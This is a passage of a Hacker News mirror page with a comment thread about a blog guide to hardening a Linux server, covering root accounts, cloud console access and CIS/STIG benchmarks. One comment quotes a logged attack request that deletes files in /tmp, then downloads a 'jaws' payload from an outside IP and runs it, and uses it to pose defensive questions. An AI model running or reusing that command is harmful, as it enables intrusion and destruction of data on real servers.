<!DOCTYPE html><html lang="en"><head><title>Static News</title><meta charSet="utf-8"/><meta name="description" content="Static delayed Hacker News."/><meta name="theme-color" media="(prefers-color-scheme: light)" content="white"/><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1d1f21"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><meta name="application-name" content="Static News"/><meta name="apple-mobile-web-app-title" content="Static News"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="#1d1f21"/><link rel="preload" href="styles.css?v=1690794075142" as="style"/><link rel="stylesheet" href="styles.css?v=1690794075142"/></head><body><div id="container"><div id="inner"><header><a href="/">Static News</a><a href="/about">about</a></header><div id="content"><div><div id="title"><a href="https://pboyd.io/posts/securing-a-linux-vm/">The Reluctant Sysadmin&#x27;s Guide to Securing a Linux Server</a> <span class="domain">(<a href="https://pboyd.io">pboyd.io</a>)</span></div><div class="subtext"><span>WallyFunk</span> | <span>82 comments</span></div><br/><div><div id="36935042" class="c"><input type="checkbox" id="c-36935042" checked=""/><div class="controls bullet"><span class="by">gazby</span><span>|</span><a href="#36935177">next</a><span>|</span><label class="collapse" for="c-36935042">[-]</label><label class="expand" for="c-36935042">[29 more]</label></div><br/><div class="children"><div class="content">There&#x27;s a reason guides like this are a dime a dozen - there is no way to generalize server configuration this broadly.<p>But as long as we&#x27;re doing it anyway - the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you&#x27;ll have no way to recover without booting into another environment.<p>Perhaps one ought not take sysadmin advice from a blog post with a first sentence that reads &quot;I’m not a sysadmin, and I don’t want to be&quot;.</div><br/><div id="36935239" class="c"><input type="checkbox" id="c-36935239" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36935239">[-]</label><label class="expand" for="c-36935239">[13 more]</label></div><br/><div class="children"><div class="content">The biggest rules about securing things is don&#x27;t be in security. Just do your diligence to put your hosts several layers away from public access and make all images and containers hardened with no elevated permissions. Sure vulnerabilities will still exist... if the only thing that can access the container is through a narrowed proxy you are not going get some dumb levels of attacks on your systems.<p>AWS allows you to ssh into your hosts from within AWS. You just manage that security. NO ONE needs public ssh access, no one needs vpn ssh access just AWS ssh access. DON&#x27;T OVER COMPLICATE THINGS!<p>I agree with you. I am not gonna say don&#x27;t follow a system engineers advice. I say follow everyone&#x27;s advice but pick out the things that seem most reasonable. If it is extra work then you&#x27;re doing it wrong, simplify everything so that the time spent on resolving issues is faster. Faster resolution means faster security fixes.</div><br/><div id="36935355" class="c"><input type="checkbox" id="c-36935355" checked=""/><div class="controls bullet"><span class="by">fmitga</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36935239">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36935355">[-]</label><label class="expand" for="c-36935355">[12 more]</label></div><br/><div class="children"><div class="content">When you say &quot;no one needs vpn ssh access&quot; vs &quot;AWS ssh access&quot;, what is the difference between the two ?</div><br/><div id="36936998" class="c"><input type="checkbox" id="c-36936998" checked=""/><div class="controls bullet"><span class="by">landemva</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36935355">parent</a><span>|</span><a href="#36935431">next</a><span>|</span><label class="collapse" for="c-36936998">[-]</label><label class="expand" for="c-36936998">[1 more]</label></div><br/><div class="children"><div class="content">The consoles at big hosts typically require good 2fa to log in to the web management console, which typically can open a command line on the instance. This is a nice authN layer.</div><br/></div></div><div id="36935431" class="c"><input type="checkbox" id="c-36935431" checked=""/><div class="controls bullet"><span class="by">mrkstu</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36935355">parent</a><span>|</span><a href="#36936998">prev</a><span>|</span><a href="#36936330">next</a><span>|</span><label class="collapse" for="c-36935431">[-]</label><label class="expand" for="c-36935431">[1 more]</label></div><br/><div class="children"><div class="content">As mentioned you then just need to lock down AWS, rather than AWS AND outside access to servers via VPN. Lessen the attack surface.</div><br/></div></div><div id="36936330" class="c"><input type="checkbox" id="c-36936330" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36935355">parent</a><span>|</span><a href="#36935431">prev</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36936330">[-]</label><label class="expand" for="c-36936330">[9 more]</label></div><br/><div class="children"><div class="content">The console in AWS allows access within its system. There is no point increasing the access area to the hosts. More surface area the easier it is to be penetrated by ssh vulnerabilities. You also shift fault to AWS rather than your company and team. You did your diligence, you just have to access control and nothing more. IF AWS has a security breach that access to your systems completely on AWS and you can demand compensation.<p>What you want to do is avoid fault, improve tolerance, but extend liability to the provider.</div><br/><div id="36937580" class="c"><input type="checkbox" id="c-36937580" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36936330">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36937580">[-]</label><label class="expand" for="c-36937580">[8 more]</label></div><br/><div class="children"><div class="content">&gt; AWS allows you to ssh into your hosts from within AWS.<p>This is where your argument breaks down IMHO.  Unless you are saying &quot;don&#x27;t expose port 22 to the world...&quot;, which is a common (small) part of security-in-depth.<p>&gt; You also shift fault to AWS rather than your company and team. You did your diligence, you just have to access control and nothing more. IF AWS has a security breach that access to your systems completely on AWS and you can demand compensation.<p>This appears to be an instance of the &quot;appeal to authority&quot;[0] fallacy and is of little solace should server(s) one is responsible for become compromised.<p>0 - <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Argument_from_authority" rel="nofollow noreferrer">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Argument_from_authority</a></div><br/><div id="36938020" class="c"><input type="checkbox" id="c-36938020" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36937580">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36938020">[-]</label><label class="expand" for="c-36938020">[7 more]</label></div><br/><div class="children"><div class="content">You still have to do your diligence. You established what is supposed be a secure system yet that system failed due to provider security. AWS is far more staffed than any other company why wouldn&#x27;t you shift left to AWS? Why would you hire a fleet of security engineers to do what AWS already established? You are breaking convention, reinventing the wheel and complicating an already simple system.<p>This isn&#x27;t fallacy it is reducing a businesses cognitive load.</div><br/><div id="36938249" class="c"><input type="checkbox" id="c-36938249" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938020">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36938249">[-]</label><label class="expand" for="c-36938249">[6 more]</label></div><br/><div class="children"><div class="content">&gt; You still have to do your diligence.<p>My point exactly.<p>&gt; You established what is supposed be a secure system yet that system failed due to provider security.<p>This makes no sense.  By your own recommendation, &quot;provider security&quot; is an AWS offering.<p>&gt; AWS is far more staffed than any other company why wouldn&#x27;t you shift left to AWS? Why would you hire a fleet of security engineers to do what AWS already established?<p>What does Amazon&#x27;s staffing have to do with best practices when securing a server deployed on their platform?  Who said anything about &quot;a fleet of security engineers&quot;?  How does any of that relate to securing that which one constructs, and ultimately is responsible for, when using said hosting services?<p>&gt; You are breaking convention, reinventing the wheel and complicating an already simple system.<p>Are you saying that your original statement of &quot;You also shift fault to AWS rather than your company and team&quot; is somehow an accepted convention?<p>And what wheel did I &quot;reinvent&quot;?<p>Finally, was my identification of the common practice which is moving sshd off of port 22 the complication to which you refer?</div><br/><div id="36938466" class="c"><input type="checkbox" id="c-36938466" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938249">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36938466">[-]</label><label class="expand" for="c-36938466">[5 more]</label></div><br/><div class="children"><div class="content">Yeaaah you&#x27;re trying poke holes. Problem is that there are larger holes in a network if you&#x27;re setting up and safe guarding a VPN so you can SSH. Moving ssh if even needed at all should be to the provider&#x27;s secured tools.<p><a href="https:&#x2F;&#x2F;aws.amazon.com&#x2F;blogs&#x2F;compute&#x2F;new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances&#x2F;" rel="nofollow noreferrer">https:&#x2F;&#x2F;aws.amazon.com&#x2F;blogs&#x2F;compute&#x2F;new-using-amazon-ec2-in...</a><p>I really don&#x27;t recommend extending responsibility for creature comforts. However you want to do this so be it.<p>&gt; This makes no sense. By your own recommendation, &quot;provider security&quot; is an AWS offering.<p>Are you stating your system is infaliable? So why would you want to bear the infaliable claim and not shift it to the company providing it?<p>&gt; What does Amazon&#x27;s staffing have to do with best practices when securing a server deployed on their platform? Who said anything about &quot;a fleet of security engineers&quot;? How does any of that relate to securing that which one constructs, and ultimately is responsible for, when using said hosting services?<p>Tooling takes a team to support it. You think every company can afford a team to manage that tooling? And why should they? Not all businesses are tech companies but still need a digital footprint. They need to be selfconcious and choose provider practices to get the most out of them.<p>&gt; Are you saying that your original statement of &quot;You also shift fault to AWS rather than your company and team&quot; is somehow an accepted convention?
Providers own the responsibility of their technology. In terms of failure if access is correctly configured and managed, yet their technology fails they owe your businesses it is very simple.<p>&gt; And what wheel did I &quot;reinvent&quot;?<p>Implementing old security practices. Why wouldn&#x27;t you move to be better pratices and prevent larger holes in your network? Often companies get into this repetitious cycle of reimplementation or reinvention of existing tools and technology just to manage access especially ssh. The convention of using a cloud platform is to use a cloud platform&#x27;s security access not some sketched up VPN and SSH system.</div><br/><div id="36939116" class="c"><input type="checkbox" id="c-36939116" checked=""/><div class="controls bullet"><span class="by">landemva</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938466">parent</a><span>|</span><a href="#36938627">next</a><span>|</span><label class="collapse" for="c-36939116">[-]</label><label class="expand" for="c-36939116">[2 more]</label></div><br/><div class="children"><div class="content">This sums it up, &quot;The convention of using a cloud platform is to use a cloud platform&quot;.<p>If you rent compute space, then you trust them to responsibly use the hypervisor instead of snooping. If you trust that or not, you are all in and may as well cement over the external port 22.</div><br/><div id="36939852" class="c"><input type="checkbox" id="c-36939852" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36939116">parent</a><span>|</span><a href="#36938627">next</a><span>|</span><label class="collapse" for="c-36939852">[-]</label><label class="expand" for="c-36939852">[1 more]</label></div><br/><div class="children"><div class="content">10000% on the money.</div><br/></div></div></div></div><div id="36938627" class="c"><input type="checkbox" id="c-36938627" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938466">parent</a><span>|</span><a href="#36939116">prev</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36938627">[-]</label><label class="expand" for="c-36938627">[2 more]</label></div><br/><div class="children"><div class="content">&gt; Yeaaah you&#x27;re trying poke holes.<p>No, I am trying to remind you of the topic which was under discussion.  To wit:<p><pre><code>  The Reluctant Sysadmin&#x27;s Guide to Securing a Linux Server
</code></pre>
&gt; Are you stating your system is infaliable?<p><pre><code>  A straw man fallacy (sometimes written as strawman) is the
  informal fallacy of refuting an argument different from
  the one actually under discussion, while not recognizing or
  acknowledging the distinction.[0]
</code></pre>
&gt; Tooling takes a team to support it.<p>See above quote.<p>&gt; You think ...<p>You do not know what I think nor my experiences, so please do not be so arrogant as to assume so.<p>&gt;&gt; And what wheel did I &quot;reinvent&quot;?<p>&gt; Implementing old security practices.<p>Again, please refer to the *article under discussion*.  In the event it remains unclear, I will restate its title:<p><pre><code>  The Reluctant Sysadmin&#x27;s Guide to Securing a Linux Server
</code></pre>
&gt; Why wouldn&#x27;t you move to be better pratices and prevent larger holes in your network?<p>See previous strawman definition and link below.<p>&gt; Often companies get into this repetitious cycle of reimplementation or reinvention of existing tools and technology just to manage access especially ssh. The convention of using a cloud platform is to use a cloud platform&#x27;s security access not some sketched up VPN and SSH system.<p>Again, see previous strawman definition above and link below.<p>Note that the only ssh-related recommendation I proffered was:<p><pre><code>  Unless you are saying &quot;don&#x27;t expose port 22 to
  the world...&quot;, which is a common (small) part of
  security-in-depth.
</code></pre>
This is a well-known, albeit very small and insufficient by itself, part of helping to reduce attack vectors.<p>As to &quot;sketched up VPN and SSH system&quot;, I have no idea as to what you are referencing.  Perhaps this is a recollection of a previous engagement wherein decisions made remind you of a bad situation similar to, but different than, this?<p>HTH<p>0 - <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Straw_man" rel="nofollow noreferrer">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Straw_man</a><p>EDIT: corrected spelling from &quot;waas&quot; to &quot;was&quot;</div><br/><div id="36939022" class="c"><input type="checkbox" id="c-36939022" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938627">parent</a><span>|</span><a href="#36939196">next</a><span>|</span><label class="collapse" for="c-36939022">[-]</label><label class="expand" for="c-36939022">[1 more]</label></div><br/><div class="children"><div class="content">Strawman argument sometimes is used to draw out a point. You can not confidently say your security solution is infabiable and nor should you. The article is just a good runbook of things and less a guide. But if you are working on the cloud you shouldn&#x27;t go using old management methods like they belong in your network.<p>You would not believe how many companies are dependent on patching through users through VPNs in order to access remote hosts. I mean some have to because of no other solutions like managing their own on-prem. I kind of would be interested in AWS access management capable of being implemented within an on-prem.</div><br/></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div id="36939196" class="c"><input type="checkbox" id="c-36939196" checked=""/><div class="controls bullet"><span class="by">usr1106</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36935239">prev</a><span>|</span><a href="#36936212">next</a><span>|</span><label class="collapse" for="c-36939196">[-]</label><label class="expand" for="c-36939196">[1 more]</label></div><br/><div class="children"><div class="content">&gt; the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you&#x27;ll have no way to recover without booting into another environment.<p>That&#x27;s not a unique or novel insight. For the case your system gets borked (either by yourself, your hardware or your cloud provider) you need a plan in advance:<p>1. How can I access the data the server has or how much of it can I afford to lose?<p>2. How do I get a replacement running within a time window acceptable for my usage?<p>The answers will be very different depending on your use case. But how you locked the root user has very little impact on them.<p>Booting into another environment is always one option in my plan so locking the root user doesn&#x27;t frighten me.</div><br/></div></div><div id="36936212" class="c"><input type="checkbox" id="c-36936212" checked=""/><div class="controls bullet"><span class="by">alsobrsp</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36939196">prev</a><span>|</span><a href="#36936106">next</a><span>|</span><label class="collapse" for="c-36936212">[-]</label><label class="expand" for="c-36936212">[5 more]</label></div><br/><div class="children"><div class="content">&gt; Perhaps one ought not take sysadmin advice from a blog post with a first sentence that reads &quot;I’m not a sysadmin, and I don’t want to be&quot;.<p>That&#x27;s just perfect.</div><br/><div id="36938146" class="c"><input type="checkbox" id="c-36938146" checked=""/><div class="controls bullet"><span class="by">at_a_remove</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36936212">parent</a><span>|</span><a href="#36936106">next</a><span>|</span><label class="collapse" for="c-36938146">[-]</label><label class="expand" for="c-36938146">[4 more]</label></div><br/><div class="children"><div class="content">That sounds reasonable, from a &quot;passion&quot; angle.<p>However, I would like to hear what someone who dislikes sysadmining but must anyway has to say.  Why?  A different perspective.  I know some sysadmins who &quot;left the car up on blocks,&quot; as in, they couldn&#x27;t stop tweaking and fixing and so on, and they love that, and that&#x27;s great.<p>Someone who is forced into the job, however, is communicating to me what I would expect to be the most necessary tasks.  Maybe I also am in a similar place and would like to get on with the rest of my job.  And in an Agile world, programmers get pushed into sysadmining ... at least, in some versions of Agile to which I have been subjected.</div><br/><div id="36938715" class="c"><input type="checkbox" id="c-36938715" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938146">parent</a><span>|</span><a href="#36936106">next</a><span>|</span><label class="collapse" for="c-36938715">[-]</label><label class="expand" for="c-36938715">[3 more]</label></div><br/><div class="children"><div class="content">&gt; However, I would like to hear what someone who dislikes sysadmining but must anyway has to say. ... Someone who is forced into the job ...<p>The only way a job is done consistently well is by those whom want to do that job well consistently.<p>HTH<p>EDIT: added missing &quot;do&quot; verb.</div><br/><div id="36938895" class="c"><input type="checkbox" id="c-36938895" checked=""/><div class="controls bullet"><span class="by">Zarathustra30</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938715">parent</a><span>|</span><a href="#36936106">next</a><span>|</span><label class="collapse" for="c-36938895">[-]</label><label class="expand" for="c-36938895">[2 more]</label></div><br/><div class="children"><div class="content">Too bad.<p>Sometimes a business can&#x27;t or won&#x27;t hire a real sysadmin. The people forced into the job need guides just as much.</div><br/><div id="36938995" class="c"><input type="checkbox" id="c-36938995" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36938895">parent</a><span>|</span><a href="#36936106">next</a><span>|</span><label class="collapse" for="c-36938995">[-]</label><label class="expand" for="c-36938995">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Too bad.<p>&gt; Sometimes a business can&#x27;t or won&#x27;t hire a real sysadmin. The people forced into the job need guides just as much.<p>I was making a more general statement regarding people having to do tasks they don&#x27;t want to do, even if they have the skills to do them.  Which makes resources helpful to &quot;people forced into the job&quot; rather difficult to produce.<p>How can one make a guide to assist people to be successful in something they don&#x27;t want to do in the first place?</div><br/></div></div></div></div></div></div></div></div></div></div><div id="36936106" class="c"><input type="checkbox" id="c-36936106" checked=""/><div class="controls bullet"><span class="by">yjftsjthsd-h</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36936212">prev</a><span>|</span><a href="#36936560">next</a><span>|</span><label class="collapse" for="c-36936106">[-]</label><label class="expand" for="c-36936106">[2 more]</label></div><br/><div class="children"><div class="content">&gt; the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you&#x27;ll have no way to recover without booting into another environment.<p>As opposed to borking the root user and being equally locked out? Assuming your sudo config is a &quot;configure it once and then leave it forever&quot; deal - which seems common IME - I can&#x27;t see any way it would be different.<p>(Mind, this cuts both ways - once you force only key-based SSH, I generally don&#x27;t see a problem with direct root access either.)</div><br/><div id="36936496" class="c"><input type="checkbox" id="c-36936496" checked=""/><div class="controls bullet"><span class="by">vbezhenar</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36936106">parent</a><span>|</span><a href="#36936560">next</a><span>|</span><label class="collapse" for="c-36936496">[-]</label><label class="expand" for="c-36936496">[1 more]</label></div><br/><div class="children"><div class="content">Just don&#x27;t set root:toor and you&#x27;ll be alright. Keys are good, but passwords are good as well.</div><br/></div></div></div></div><div id="36936560" class="c"><input type="checkbox" id="c-36936560" checked=""/><div class="controls bullet"><span class="by">ozim</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36936106">prev</a><span>|</span><a href="#36936583">next</a><span>|</span><label class="collapse" for="c-36936560">[-]</label><label class="expand" for="c-36936560">[4 more]</label></div><br/><div class="children"><div class="content">You shouldn’t need root, you should have another person with admin rights as a backup plan.<p>It is a vm so if you do something that would break sudo or all your users you should have a vm snapshot at your fingertips ready to restore from AWS interface.<p>Even if you are running bare metal you should setup snapshots first but nowadays no one runs bare metal web servers it is still som hyper visor with bunch of vm-s that are easy to backup restore or just delete and create fresh.</div><br/><div id="36937401" class="c"><input type="checkbox" id="c-36937401" checked=""/><div class="controls bullet"><span class="by">windexh8er</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36936560">parent</a><span>|</span><a href="#36936583">next</a><span>|</span><label class="collapse" for="c-36937401">[-]</label><label class="expand" for="c-36937401">[3 more]</label></div><br/><div class="children"><div class="content">&gt; You shouldn’t need root, you should have another person with admin rights as a backup plan.<p>What?<p>I am the only admin on about a dozen machines. I&#x27;m not outsourcing that to a friend.  That trust model is much more flawed than separation of duties and permissions segmentation as part of my administration routine.</div><br/><div id="36939683" class="c"><input type="checkbox" id="c-36939683" checked=""/><div class="controls bullet"><span class="by">ozim</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36937401">parent</a><span>|</span><a href="#36939960">next</a><span>|</span><label class="collapse" for="c-36939683">[-]</label><label class="expand" for="c-36939683">[1 more]</label></div><br/><div class="children"><div class="content">Your manager or company owner should have admin account then, he should not use it for anything besides disaster recovery.<p>If you are single person shop that is your choice, have a root account or whatever you feel like having.</div><br/></div></div><div id="36939960" class="c"><input type="checkbox" id="c-36939960" checked=""/><div class="controls bullet"><span class="by">vladvasiliu</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36937401">parent</a><span>|</span><a href="#36939683">prev</a><span>|</span><a href="#36936583">next</a><span>|</span><label class="collapse" for="c-36939960">[-]</label><label class="expand" for="c-36939960">[1 more]</label></div><br/><div class="children"><div class="content">What happens if you get hit by a bus, or become otherwise incapacitated?</div><br/></div></div></div></div></div></div><div id="36936583" class="c"><input type="checkbox" id="c-36936583" checked=""/><div class="controls bullet"><span class="by">strzibny</span><span>|</span><a href="#36935042">parent</a><span>|</span><a href="#36936560">prev</a><span>|</span><a href="#36935177">next</a><span>|</span><label class="collapse" for="c-36936583">[-]</label><label class="expand" for="c-36936583">[3 more]</label></div><br/><div class="children"><div class="content">That&#x27;s not true. It&#x27;s not obvious what user you have that could do sudo. Thus it does improve security. I advice the same in my book (Deployment from Scratch) and I suggest that for both the host system and containers. There is little cost to not primarily using root.</div><br/><div id="36937795" class="c"><input type="checkbox" id="c-36937795" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36935042">root</a><span>|</span><a href="#36936583">parent</a><span>|</span><a href="#36935177">next</a><span>|</span><label class="collapse" for="c-36937795">[-]</label><label class="expand" for="c-36937795">[2 more]</label></div><br/><div class="children"><div class="content">&gt;&gt; But as long as we&#x27;re doing it anyway - the only thing that locking the root account gets you is assurance that if you ever bork the user you created in this guide (or sudo functionality as a whole) you&#x27;ll have no way to recover without booting into another environment.<p>&gt; That&#x27;s not true. It&#x27;s not obvious what user you have that could do sudo. Thus it does improve security. I advice the same in my book (Deployment from Scratch) and I suggest that for both the host system and containers. There is little cost to not primarily using root.<p>It is true.  To ensure root cannot be used when ssh&#x27;ing into a server, set &quot;PermitRootLogin&quot; to &quot;no&quot; in sshd_config (as mentioned in the OP).<p>Locking out root entirely, as further mentioned in the OP and suggested by your comment, does nothing to increase security regarding remote penetration attacks.  Furthermore, should a non-root account which has sudo privileges be compromised, an argument could be made that having a functional root account with its own password accessible only locally and <i>not</i> enabling sudo is a more secure approach.<p>Either way, having a root account which can only be used locally ensures there is a recovery workflow should one be needed, as the GP enumerates.</div><br/></div></div></div></div></div></div><div id="36935177" class="c"><input type="checkbox" id="c-36935177" checked=""/><div class="controls bullet"><span class="by">teddyh</span><span>|</span><a href="#36935042">prev</a><span>|</span><a href="#36939938">next</a><span>|</span><label class="collapse" for="c-36935177">[-]</label><label class="expand" for="c-36935177">[3 more]</label></div><br/><div class="children"><div class="content">I would instead suggest the <i>official</i> guide; the <i>Securing Debian Manual</i> &lt;<a href="https:&#x2F;&#x2F;www.debian.org&#x2F;doc&#x2F;manuals&#x2F;securing-debian-manual&#x2F;" rel="nofollow noreferrer">https:&#x2F;&#x2F;www.debian.org&#x2F;doc&#x2F;manuals&#x2F;securing-debian-manual&#x2F;</a>&gt;</div><br/><div id="36936128" class="c"><input type="checkbox" id="c-36936128" checked=""/><div class="controls bullet"><span class="by">nemo8551</span><span>|</span><a href="#36935177">parent</a><span>|</span><a href="#36939938">next</a><span>|</span><label class="collapse" for="c-36936128">[-]</label><label class="expand" for="c-36936128">[2 more]</label></div><br/><div class="children"><div class="content">It might be a bit corporate now but a few years back I found the security aspects of the redhat admin training to be decent enough for most folk.</div><br/><div id="36939947" class="c"><input type="checkbox" id="c-36939947" checked=""/><div class="controls bullet"><span class="by">teddyh</span><span>|</span><a href="#36935177">root</a><span>|</span><a href="#36936128">parent</a><span>|</span><a href="#36939938">next</a><span>|</span><label class="collapse" for="c-36939947">[-]</label><label class="expand" for="c-36939947">[1 more]</label></div><br/><div class="children"><div class="content">The article was explicitly targeted at “Debian 11 (Bullseye) or Ubuntu”.</div><br/></div></div></div></div></div></div><div id="36939938" class="c"><input type="checkbox" id="c-36939938" checked=""/><div class="controls bullet"><span class="by">gus_</span><span>|</span><a href="#36935177">prev</a><span>|</span><a href="#36934509">next</a><span>|</span><label class="collapse" for="c-36939938">[-]</label><label class="expand" for="c-36939938">[1 more]</label></div><br/><div class="children"><div class="content">&gt; GET &#x2F;shell?cd+&#x2F;tmp;rm+-rf+*;wget+ 107.6.255.231&#x2F;jaws;sh+&#x2F;tmp&#x2F;jaws<p>in the case of a successful attack, some questions to ask could be:<p>- why did they manage to use wget?<p>- why {apache,nginx,postfix,exim,sendmail,...} is allowed to use wget, or curl, or nc or bash (or ...)?<p>- why is wget, curl, nc, telnet, .. installed on the server? can they be uninstalled?
 with (!!) if it&#x27;s a container.<p>- why did they manage to execute files from &#x2F;tmp, or &#x2F;var&#x2F;tmp, or &#x2F;dev&#x2F;shm? do these directories need write access for &quot;others&quot; or can they be mounted with &quot;noexec&quot;?<p>- ufw&#x2F;iptables&#x2F;nftables won&#x27;t stop local binaries from opening outbound connections, how would you stop outbound connections by binary, path, etc?<p>- if they managed to wipe the logs, how could you have known all the commands they executed? could auditd+grafana (just an example) have helped here by sending logs to a remote server?</div><br/></div></div><div id="36934509" class="c"><input type="checkbox" id="c-36934509" checked=""/><div class="controls bullet"><span class="by">jeffbee</span><span>|</span><a href="#36939938">prev</a><span>|</span><a href="#36937949">next</a><span>|</span><label class="collapse" for="c-36934509">[-]</label><label class="expand" for="c-36934509">[15 more]</label></div><br/><div class="children"><div class="content">It&#x27;s weird to begin such an exercise without stating what the point of &quot;the server&quot; is supposed to be. Is it a ... web server? Interactive unix logins for developers? Mail relay? What does it do? This is the key point of the analysis because &quot;securing&quot; a server consists in making it incapable of doing anything not in the set of things it is meant to do. Notably, starting from this side of the problem can lead you away from &quot;standard machine image&quot;. Starting with a kitchen-sink Linux distro like Ubuntu is <i>not</i> the road to hardness.</div><br/><div id="36934787" class="c"><input type="checkbox" id="c-36934787" checked=""/><div class="controls bullet"><span class="by">linuxdude314</span><span>|</span><a href="#36934509">parent</a><span>|</span><a href="#36934594">next</a><span>|</span><label class="collapse" for="c-36934787">[-]</label><label class="expand" for="c-36934787">[6 more]</label></div><br/><div class="children"><div class="content">It&#x27;s really not weird, that&#x27;s not how security works.<p>What the application is doing is relevant to application security, but the whole point of securing the OS is to eliminate the necessity for &quot;trusting&quot; the application.<p>When you are securing an operating system, you must assume the application that is exposed to the operating environment (be that the internet, local LAN, even simply user logged into the workstation in the case of a GUI or CLI app) is compromised.<p>The primary goal of most security measures is preventing and detecting privilege escalation and lateral movement within the OS or network.<p>There are a lot of best practices that apply in general to securing an operating system.  If you want to dig deeper, one of the best resources for this information is provided by CIS (Center for Internet Security).<p>CIS has hardening standards for most OS&#x27;s yes even including Ubuntu.  
<a href="https:&#x2F;&#x2F;www.cisecurity.org&#x2F;benchmark&#x2F;ubuntu_linux" rel="nofollow noreferrer">https:&#x2F;&#x2F;www.cisecurity.org&#x2F;benchmark&#x2F;ubuntu_linux</a><p>These are standards that many security conscious organizations apply to their servers. The US government takes it a step further with DISA&#x27;s STIGs.<p>DISA STIG&#x27;s are similar to CIS&#x27;s benchmarks, but result in an even more locked down environment and place extreme restrictions on which crypto libraries are allowed to be used.<p>In short, securing the OS is a standard best practice that all organizations should be doing. Unfortunately most startups lack engineers with the expertise in building custom linux images so a lot of folks are quite unfamiliar with hardening procedures.<p>You should absolutely NOT use a non-standard OS because you think it will be more secure.  It&#x27;s a much better idea to use known industry standard security benchmarks on supported Linux distributions than trying to bake your own standard some non Debian&#x2F;RHEL based bistro.</div><br/><div id="36934871" class="c"><input type="checkbox" id="c-36934871" checked=""/><div class="controls bullet"><span class="by">doublepg23</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36934787">parent</a><span>|</span><a href="#36934594">next</a><span>|</span><label class="collapse" for="c-36934871">[-]</label><label class="expand" for="c-36934871">[5 more]</label></div><br/><div class="children"><div class="content">IME the checklists and guides can be a useful resource but are mostly  “cover your a$$” documentation, often time falling into cargo cult suggestions just to add more check-boxes.</div><br/><div id="36935123" class="c"><input type="checkbox" id="c-36935123" checked=""/><div class="controls bullet"><span class="by">linuxdude314</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36934871">parent</a><span>|</span><a href="#36934594">next</a><span>|</span><label class="collapse" for="c-36935123">[-]</label><label class="expand" for="c-36935123">[4 more]</label></div><br/><div class="children"><div class="content">You must be using the wrong &#x27;checklists&#x27; (they aren&#x27;t checklists, they are implementation guidelines).  CIS benchmarks and DISA STIGs provide concrete actions that lead to a more secure system. Sure some of them might not apply specifically to your environment, but in general they are an excellent starting point.<p>Some of the line items can be a bit arcane or not as relevant in cloud environments, etc... but that&#x27;s a far cry from calling them CYA.<p>Nothing cargo cult about enabling SE Linux, restricting access with IP tables, configuring AuditD and AIDE.</div><br/><div id="36935956" class="c"><input type="checkbox" id="c-36935956" checked=""/><div class="controls bullet"><span class="by">generalizations</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36935123">parent</a><span>|</span><a href="#36938910">next</a><span>|</span><label class="collapse" for="c-36935956">[-]</label><label class="expand" for="c-36935956">[2 more]</label></div><br/><div class="children"><div class="content">&gt; Nothing cargo 